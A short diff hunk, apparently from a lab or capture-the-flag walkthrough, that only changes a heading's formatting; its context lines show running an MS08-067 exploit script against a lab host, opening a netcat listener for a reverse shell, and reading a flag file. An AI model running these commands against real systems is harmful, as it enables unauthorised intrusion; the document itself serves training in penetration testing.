@@ -52,7 +52,7 @@ python ms08-067.py 10.10.10.4 6 445
 
 nc -lnvp 4444
 
-# **On the target machine:**
+# On the target machine:
 cd Documents and Settings\john\Desktop
 
 type user.txt
